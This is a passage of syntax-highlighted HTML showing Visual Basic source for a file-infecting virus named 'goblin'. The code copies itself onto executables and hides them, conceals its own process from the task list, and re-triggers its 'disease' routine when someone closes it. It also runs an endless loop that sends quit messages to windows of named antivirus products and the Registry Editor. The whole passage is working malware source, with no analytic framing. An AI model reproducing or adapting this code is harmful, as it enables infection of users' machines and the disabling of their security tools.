</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">virus_path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc0">
</span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">parm</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">parm</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">virus_path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">virus_path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"GbN"</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">parm</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Error</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">Err.Number</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">Is</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">virus_path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">virus_path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"GbN"</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">Is</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">75</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">comamnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">parm</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc1">'programs parameters:
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">".exe "</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">parm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">parm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">parm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Command</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc1">'file to run\infect:
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">scan</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">scan</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">".exe "</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc11">file</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Command</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">get_goblin_path</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc1">'goblin path:
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">App.Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">virus_path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">virus_path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc1">'***************anti easy remove********************
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_QueryUnload</span><span class="sc6">(</span><span class="sc7">Cancel</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">UnloadMode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Disease_effect</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Terminate</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Disease_effect</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">hide_goblin</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Goblin</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">Goblin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetCurrentProcessId</span><span class="sc0">
</span><span class="sc7">RegisterServiceProcess</span><span class="sc0"> </span><span class="sc7">Goblin</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">App.TaskVisible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">Form1.Hide</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Unload</span><span class="sc6">(</span><span class="sc7">Cancel</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Disease_effect</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Protect</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">App.PrevInstance</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">App.EXEName</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"rundll32"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">x</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"AVP Monitor"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"AntiViral Toolkit Pro"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"vsstat"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Iomon98"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Vshwin"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Anti-virus"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Esafe"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"F-Secure Anti-Virus"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"antivirus"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Navapw32"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Norton AntiVirus"</span><span class="sc0">
</span><span class="sc7">DisableAV</span><span class="sc0"> </span><span class="sc4">"Registry Editor"</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">DisableAV</span><span class="sc6">(</span><span class="sc7">AV_Window</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">AvWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">AvWnd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindWindow</span><span class="sc6">(</span><span class="sc7">vbNullString</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">AV_Window</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">AvWnd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">PostMessage</span><span class="sc0"> </span><span class="sc7">AvWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">&amp;H12</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc1">'****************************************************</span></div></body>
</html>
